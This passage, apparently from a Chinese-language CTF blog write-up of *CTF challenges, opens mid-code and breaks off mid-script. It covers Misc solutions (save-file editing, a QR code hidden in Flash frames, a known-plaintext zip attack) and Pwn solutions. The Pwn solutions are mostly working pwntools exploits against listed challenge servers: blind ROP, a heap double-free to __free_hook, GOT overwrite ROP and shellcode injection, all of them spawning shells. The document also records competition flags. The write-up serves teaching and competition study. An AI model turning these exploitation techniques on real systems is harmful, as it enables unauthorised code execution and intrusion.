:D</span><br><span class="line">$reply = &lt;out2&gt;;</span><br><span class="line">print STDOUT $reply; #flag :D</span><br></pre></td></tr></table></figure><h2><span id="misc">Misc</span></h2><h3><span id="she">she</span></h3><p>根据提示，杀死左小角小屋内的鸡拿flag。</p><p>先跟右下角的女生对话后会不能存档。</p><p>存个档，进右上角小屋杀只怪，升一级的点前后再存档，比较两个存档的不同。</p><p>再存档内可以看到gold，exp，level等后面的数值不一样。稍微修改一下，发现存数据的规律：</p><p>0x69表示类型位整型，下一个字符表示用到多少字节存数据，只用1字节的时候不要，最多四字节，因此所有数据都是5开始的。我们把金钱，经验值调大，进游戏一刀满级，然后去左上角的商店买装备。</p><p>然而还是打不过，想了想鸡的攻防可能超过我们已有的最高攻防了。</p><p>这是可以改游戏文件，把鸡的攻防调为最低。</p><p>在data文件夹内有个叫enemies的文件，在里面可以看到大概是两个敌人，一个叫Julia，就是那只鸡，一个叫Trainer训练假人。</p><p>稍微摸索一下数据，看到几个比较关键的比如def，atk等，或者直接干脆把所有的都改成05 或者06。</p><p>再去打鸡，可以一刀秒了。</p><p>接下来还不能直接拿flag，根据提示，打开所有的门中的宝箱。有些门不能直接开，开完后面的门才能开。基本这里就是比走位躲幽灵的时间了。</p><p>所有门开完后最后的多了个门，里面提示把之前宝箱内的数字连起来md5即是flag。</p><p>数字要按顺序从左到右</p><p>213697</p><p>*ctf{d6f3fdffbcb462607878af65d059f274}</p><h3><span id="babyflash">babyflash</span></h3><p>打开看到黑白黑白的，用工具打开，有图片、有声音</p><p>flash总共441帧，21*21？联想到二维码<br>导出所有图片，用脚本拼成二维码，如下图，扫出来只有一半flag</p><p>刚刚还有声音，导出来看看有什么<br>用audacity看频谱图，就有了剩下另一半</p><blockquote><p>*ctf{half<em>flag\</em>&amp;&amp;_the_rest}</p></blockquote><h3><span id="otaku">otaku</span></h3><p>附件里的文档，提到的内容与<a href="https://www.imdb.com/title/tt7225072/有关" target="_blank" rel="noopener">https://www.imdb.com/title/tt7225072/有关</a><br>应该与解密压缩包的key有关，一部日本的一部动漫<br>英文名：Violet Evergarden<br>日文名：ヴァイオレット·エヴァーガーデン</p><p>otaku是宅男的意思。</p><p>原文<br><a href="https://www.imdb.com/title/tt7225072/plotsummary?ref_=tt_ov_pl" target="_blank" rel="noopener">https://www.imdb.com/title/tt7225072/plotsummary?ref_=tt_ov_pl</a></p><p>比对word</p><p>这里少了I love you<br>但是输入密码不对。。。。</p><p>word还有个Memory 但是原文是Memoir ，但是应该无关<br>重点在文档中这句话</p><p>复制出来竟然是这个：</p><p>Violet then remembers that “I love you Hello everyone, I am Gilbert. Everyone thought that I was killed, but actually I survived. Now that I have no cash with me and I’m trapped in another country. I can’t contact Violet now. She must be desperate to see me and I don’t want her to cry for me. I need to pay 300 for the train, and 88 for the meal. Cash or battlenet point are both accepted. I don’t play the Hearthstone, and I don’t even know what is Rastakhan’s Rumble.” were the last words Gilbert I-the-almighty-quiz-maker had told her.</p><p>输入别的密码会提示密码错误，输入Hearthstone会提示文件损坏。。。<br>原始压缩包用rar修复一下，可以提取flag.zip，里面有flag.png和last words.txt</p><p>把这段话GBK编码后加密的word,txt字节相同，是已知明文攻击<br>Hello everyone, I am Gilbert. Everyone thought that I was killed, but actually I survived. Now that I have no cash with me and I’m trapped in another country. I can’t contact Violet now. She must be desperate to see me and I don’t want her to cry for me. I need to pay 300 for the train, and 88 for the meal. Cash or battlenet point are both accepted. I don’t play the Hearthstone, and I don’t even know what is Rastakhan’s Rumble.</p><p>明文攻击成功，那道flag.png<br>lsb隐写用zsteg一把梭</p><blockquote><p>*ctf{vI0l3t_Ev3rg@RdeN}</p></blockquote><h2><span id="pwn">Pwn</span></h2><h3><span id="blind-pwn">blind pwn</span></h3><p>Step1:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#/usr/bin</span><br><span class="line">#coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">i = 1</span><br><span class="line">len = 0</span><br><span class="line">while 1:</span><br><span class="line">   try:</span><br><span class="line">       sh = remote(&apos;34.92.37.22&apos;, 10000)</span><br><span class="line">       sh.recvuntil(&apos;Welcome to this blind pwn!\n&apos;)</span><br><span class="line">       sh.send(i * &apos;a&apos;)</span><br><span class="line">       output = sh.recv()</span><br><span class="line">       sh.close()</span><br><span class="line">       if not output.startswith(&apos;Goodbye!&apos;):</span><br><span class="line">           len = i - 1</span><br><span class="line">           break</span><br><span class="line">       else:</span><br><span class="line">           i += 1</span><br><span class="line">   except EOFError:</span><br><span class="line">       sh.close()</span><br><span class="line">       print &quot;EOF error!&quot;</span><br><span class="line">       len = i - 1</span><br><span class="line">       break</span><br><span class="line"></span><br><span class="line">print len</span><br></pre></td></tr></table></figure><p>stack length: 40</p><p>-————-</p><p>可以试下 ‘a’*0x28+’\n’ 会在goodbye后还输出一堆东西，不过看了下，好像没什么地址之类的<br>Step2:</p><p>找到一个stop gadget:<br>0x400776，貌似是main函数，反正又会输出一遍</p><p>找到一个stop gadget:<br>0x400515 输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x15\x05@\x00\x00\x00\x00\x00</span><br><span class="line">\x12\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00 \x07@\x00\x00\x00\x00\x000\x8b\x0c\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x0\x12\x7f\x00\x00\xa0\xbc+\x8c\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa3Y\x9cF\x1cFn\x7fp\x05@\x00\x00\x00\x00\x00\x00\x12\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa3Y\xbcjZa\x91\x80\xa3Y\x0cQw\x81\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x12\x7f\x00\x00h+\x8c\x0c\x7f\x00\x00g</span><br><span class="line">\x8c\x0c\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00p\x05@\x00\x00\x00\x00\x00\x00\x12\x7f\x00\x00</span><br></pre></td></tr></table></figure><p>get stop gadget:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x400000</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">       sh = remote(<span class="string">'34.92.37.22'</span>, <span class="number">10000</span>)</span><br><span class="line">       sh.recvuntil(<span class="string">'Welcome to this blind pwn!\n'</span>)</span><br><span class="line">       payload = <span class="string">'a'</span> * <span class="number">40</span> + p64(addr)</span><br><span class="line">       sh.sendline(payload)</span><br><span class="line">       content = sh.recv()</span><br><span class="line">       <span class="keyword">print</span> content</span><br><span class="line">       sh.close()</span><br><span class="line">       <span class="keyword">print</span> <span class="string">'one success stop gadget addr: 0x%x'</span> % (addr)</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">   <span class="keyword">except</span> Exception:</span><br><span class="line">       addr += <span class="number">1</span></span><br><span class="line">       sh.close()</span><br></pre></td></tr></table></figure><p>测试了下，好像只能溢出8个字节，跳到0x400515 就跳不回main函数了</p><p>感觉是它有调用sleep</p><p>main函数地址错了，真正的是0x400570</p><p>payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">''</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'34.92.37.22'</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'Welcome to this blind pwn!\n'</span>)</span><br><span class="line"><span class="comment">#0x400755</span></span><br><span class="line"><span class="comment">#0x40072f</span></span><br><span class="line">se(<span class="string">'a'</span>*<span class="number">0x28</span>+p64(<span class="number">0x400515</span>)+p64(<span class="number">0x400570</span>)*<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">'a'</span>*<span class="number">0x28</span>)</span><br><span class="line">data = p.recv(<span class="number">0x100</span>)</span><br><span class="line">libc = u64(data[<span class="number">0x20</span>:<span class="number">0x28</span>])</span><br><span class="line">base = libc - <span class="number">0x020830</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">'Welcome to this blind pwn!\n'</span>)</span><br><span class="line">se(<span class="string">'a'</span>*<span class="number">0x28</span>+p64(base+<span class="number">0x4526a</span>)+<span class="string">'\x00'</span>*<span class="number">0x40</span>)</span><br><span class="line">print(hex(base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>*CTF{Qri2H5GjeaO1E9Jg6dmwcUvSLX8RxpI7}</p></blockquote><h3><span id="girlfriend">girlfriend</span></h3><p>调了一个小时，最后发现是网络问题．．．网络差评</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="comment">#p=process(["./lib/ld-2.29.so","./chall"],env=&#123;"LD_PRELOAD":"./lib/libc.so.6"&#125;)</span></span><br><span class="line">libc=ELF(<span class="string">"./lib/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process("./chall")</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p=remote(<span class="string">"34.92.96.238"</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name,call)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Input your choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Please input the size of girl's name"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"please inpute her name:"</span>)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(<span class="string">"please input her call:"</span>)</span><br><span class="line">p.send(call)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Input your choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Please input the index:"</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Input your choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Please input the index:"</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">"po\n"</span>,<span class="string">"999\n"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">"po\n"</span>,<span class="string">"999\n"</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">"po\n"</span>,<span class="string">"999\n"</span>) <span class="comment">#2</span></span><br><span class="line">call(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"name:\n"</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>)+<span class="string">"\x00\x00"</span>)<span class="number">-0x3b1ca0</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">call(<span class="number">1</span>)</span><br><span class="line">call(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"name:\n"</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>)+<span class="string">"\x00\x00"</span>)<span class="number">-0x7b0</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_base)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"p\n"</span>,<span class="string">"9\n"</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"p\n"</span>,<span class="string">"9\n"</span>) <span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"p\n"</span>,<span class="string">"9\n"</span>) <span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"p\n"</span>,<span class="string">"9\n"</span>) <span class="comment">#12</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">call(<span class="number">3</span>+i)</span><br><span class="line"></span><br><span class="line">call(<span class="number">10</span>)</span><br><span class="line">call(<span class="number">11</span>)</span><br><span class="line">call(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"p\n"</span>,<span class="string">"9\n"</span>) <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook),<span class="string">"999\n"</span>)</span><br><span class="line">one_gadget=libc_base+<span class="number">0xdf991</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0xdf991execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"p\n"</span>,<span class="string">"9\n"</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"/bin/sh\x00\n"</span>,<span class="string">"9\n"</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(system)+<span class="string">"\n"</span>,<span class="string">"9\n"</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"/bin/sh\x00"</span>,<span class="string">"9\n"</span>) <span class="comment">#0x18</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"/bin/sh\x00"</span>,<span class="string">"9\n"</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"/bin/sh\x00"</span>,<span class="string">"9\n"</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"/bin/sh\x00"</span>,<span class="string">"9\n"</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"/bin/sh\x00"</span>,<span class="string">"9\n"</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"/bin/sh\x00"</span>,<span class="string">"9\n"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"???"</span></span><br><span class="line">call(<span class="number">0x1a</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>*CTF{pqyPl2seQzkX3r0YntKfOMF4i8agb56D}</p></blockquote><h3><span id="quicksort">quicksort</span></h3><p>覆盖ptr达到任意地址写，写的时候注意栈分布，修改atoi进行rop即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">fpath        = <span class="string">"./quicksort"</span></span><br><span class="line">offset       = <span class="number">28</span></span><br><span class="line">debug        = <span class="number">1</span></span><br><span class="line">times = <span class="number">2</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">e = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"><span class="keyword">if</span> debug <span class="keyword">is</span> <span class="number">0</span>:</span><br><span class="line">     r = process(fpath)</span><br><span class="line">     gdb.attach(p)<span class="comment">#"b *0x8048916")</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">     r = remote(<span class="string">"34.92.96.238"</span>,<span class="number">10000</span>)</span><br><span class="line">r.recvuntil(<span class="string">"how many numbers do you want to sort?\n"</span>)</span><br><span class="line">r.sendline(str(times))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"th number:"</span>)p</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"134515285"</span> + <span class="string">"a"</span> * <span class="number">7</span> + p32(<span class="number">0x8048a53</span> + <span class="number">3</span>) + p32(<span class="number">0x8048a53</span>) + p32(<span class="number">0x8048a53</span> + <span class="number">3</span>) + p32(<span class="number">0x804A020</span> - <span class="number">0x8048a53</span> * <span class="number">4</span> + <span class="number">0x100000000</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">puts_plt = <span class="number">0x8048560</span></span><br><span class="line">puts_got = <span class="number">0x804A02C</span></span><br><span class="line">gets_plt = <span class="number">0x08048500</span></span><br><span class="line">r.recvuntil(<span class="string">"th number:"</span>)</span><br><span class="line"><span class="comment">#leak -&gt; gets -&gt;shell</span></span><br><span class="line">payload = <span class="string">"13451529"</span> + p32(<span class="number">0x8048530</span>) + p32(<span class="number">0x01010101</span>) + p32(<span class="number">0x8048a53</span> + <span class="number">3</span>) + p32(<span class="number">0x8048a53</span>) + p32(<span class="number">0x8048a53</span> + <span class="number">3</span>) + p32(<span class="number">0x804A038</span> - <span class="number">0x8048a53</span> * <span class="number">4</span> + <span class="number">0x100000000</span>) + p32(<span class="number">0x01010101</span>) + p32(<span class="number">0x8048a5a</span>)</span><br><span class="line">payload += p32(puts_plt) + p32(<span class="number">0x8048a5a</span>) + p32(puts_got) + p32(<span class="number">0x01010101</span>)</span><br><span class="line">payload += p32(gets_plt) + p32(<span class="number">0x8048a5a</span>) + p32(<span class="number">0x804A034</span>) + p32(<span class="number">0x804A034</span>)</span><br><span class="line">payload += p32(<span class="number">0x8048580</span>) + p32(<span class="number">0x8048a5a</span>) + p32(<span class="number">0x804A038</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"th number:"</span>)</span><br><span class="line">r.sendline()</span><br><span class="line"></span><br><span class="line">libc = u32(r.recv()[:<span class="number">4</span>]) - <span class="number">0x5fca0</span></span><br><span class="line"></span><br><span class="line">r.sendline(p32(libc + e.symbols[<span class="string">"system"</span>]) + <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3><span id="babyshell">babyshell</span></h3><p>这道题迷之简单，简单绕一下判断就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./shellcode'</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'34.92.37.22'</span>, <span class="number">10002</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'give me shellcode, plz:\n'</span>)</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">se(<span class="string">'s\x00'</span>+asm(shellcraft.sh()))   </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>*CTF{LtMh5VbedHlngmKOS2cwWRo4AkDGzCBy}</p></blockquote><h3><span id="upxofnote">upxofnote</span></h3><p>upx解压后，heap段是可执行的，因此可以用来写shellcode get shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./upxofcpp'</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'34.92.121.149'</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,sz,content)</span>:</span></span><br><span class="line">    